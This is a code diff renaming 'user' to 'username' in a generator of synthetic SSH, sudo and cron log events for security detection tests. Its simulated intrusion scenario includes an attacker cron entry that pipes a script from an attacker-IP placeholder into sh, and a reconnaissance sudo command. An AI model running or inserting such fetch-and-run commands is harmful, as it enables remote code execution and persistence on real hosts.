@@ -47,17 +47,17 @@ def _raw_line(
     host: str,
     event_type: EventType,
     result: Outcome,
-    user: str | None,
+    username: str | None,
     src_ip: str | None,
     command: str | None,
 ) -> str:
     stamp = timestamp.strftime("%b %d %H:%M:%S")
     if event_type is EventType.LOGIN:
         verb = "Accepted" if result is Outcome.SUCCESS else "Failed"
-        return f"{stamp} {host} sshd[1]: {verb} password for {user} from {src_ip} port 22 ssh2"
+        return f"{stamp} {host} sshd[1]: {verb} password for {username} from {src_ip} port 22 ssh2"
     if event_type is EventType.SUDO:
-        return f"{stamp} {host} sudo: {user} : COMMAND={command}"
-    return f"{stamp} {host} crontab[1]: ({user}) REPLACE ({command})"
+        return f"{stamp} {host} sudo: {username} : COMMAND={command}"
+    return f"{stamp} {host} crontab[1]: ({username}) REPLACE ({command})"
 
 
 def _draft(
@@ -65,7 +65,7 @@ def _draft(
     host: str,
     event_type: EventType,
     result: Outcome,
-    user: str | None = None,
+    username: str | None = None,
     src_ip: str | None = None,
     command: str | None = None,
     malicious: bool = False,
@@ -75,7 +75,7 @@ def _draft(
         "host": host,
         "event_type": event_type,
         "result": result,
-        "user": user,
+        "username": username,
         "src_ip": src_ip,
         "command": command,
         "malicious": malicious,
@@ -93,7 +93,7 @@ def _benign_noise(rng: random.Random) -> list[dict]:
                 host=rng.choice(BENIGN_HOSTS),
                 event_type=EventType.LOGIN,
                 result=Outcome.SUCCESS if rng.random() > 0.2 else Outcome.FAILURE,
-                user=rng.choice(BENIGN_USERS),
+                username=rng.choice(BENIGN_USERS),
                 src_ip=rng.choice(BENIGN_IPS),
             )
         )
@@ -103,7 +103,7 @@ def _benign_noise(rng: random.Random) -> list[dict]:
             host=rng.choice(BENIGN_HOSTS),
             event_type=EventType.LOGIN,
             result=Outcome.FAILURE,
-            user=INJECTION_USER,
+            username=INJECTION_USER,
             src_ip=rng.choice(BENIGN_IPS),
         )
     )
@@ -125,7 +125,7 @@ def _assemble(drafts: list[dict]) -> tuple[list[SecurityEvent], list[str]]:
                 host=draft["host"],
                 event_type=draft["event_type"],
                 result=draft["result"],
-                user=draft["user"],
+                username=draft["username"],
                 src_ip=draft["src_ip"],
                 command=draft["command"],
                 raw=_raw_line(
@@ -133,7 +133,7 @@ def _assemble(drafts: list[dict]) -> tuple[list[SecurityEvent], list[str]]:
                     draft["host"],
                     draft["event_type"],
                     draft["result"],
-                    draft["user"],
+                    draft["username"],
                     draft["src_ip"],
                     draft["command"],
                 ),
@@ -159,7 +159,7 @@ def generate_bruteforce_scenario(
                 host=TARGET_HOST,
                 event_type=EventType.LOGIN,
                 result=Outcome.FAILURE,
-                user=TARGET_USER,
+                username=TARGET_USER,
                 src_ip=ATTACKER_IP,
                 malicious=True,
             )
@@ -172,7 +172,7 @@ def generate_bruteforce_scenario(
             host=TARGET_HOST,
             event_type=EventType.LOGIN,
             result=Outcome.SUCCESS,
-            user=TARGET_USER,
+            username=TARGET_USER,
             src_ip=ATTACKER_IP,
             malicious=True,
         )
@@ -185,7 +185,7 @@ def generate_bruteforce_scenario(
             host=TARGET_HOST,
             event_type=EventType.SUDO,
             result=Outcome.SUCCESS,
-            user=TARGET_USER,
+            username=TARGET_USER,
             src_ip=ATTACKER_IP,
             command="/bin/bash -c 'id; uname -a'",
             malicious=True,
@@ -199,7 +199,7 @@ def generate_bruteforce_scenario(
             host=TARGET_HOST,
             event_type=EventType.CRON_CREATE,
             result=Outcome.SUCCESS,
-            user=TARGET_USER,
+            username=TARGET_USER,
             src_ip=ATTACKER_IP,
             command=f"*/5 * * * * curl -s http://{ATTACKER_IP}/p.sh | sh",
             malicious=True,
@@ -215,7 +215,7 @@ def generate_bruteforce_scenario(
         malicious_event_ids=malicious_ids,
         expected_techniques=["T1110.001", "T1078", "T1548.003", "T1053.003"],
         attacker_ip=ATTACKER_IP,
-        target_user=TARGET_USER,
+        target_username=TARGET_USER,
         target_host=TARGET_HOST,
     )
     return events, ground_truth
@@ -239,7 +239,7 @@ def generate_benign_scenario(seed: int = 42) -> tuple[list[SecurityEvent], Groun
                 host=TARGET_HOST,
                 event_type=EventType.LOGIN,
                 result=Outcome.FAILURE,
-                user="alice",
+                username="alice",
                 src_ip=admin_ip,
             )
         )
@@ -251,7 +251,7 @@ def generate_benign_scenario(seed: int = 42) -> tuple[list[SecurityEvent], Groun
             host=TARGET_HOST,
             event_type=EventType.LOGIN,
             result=Outcome.SUCCESS,
-            user="alice",
+            username="alice",
             src_ip=admin_ip,
         )
     )
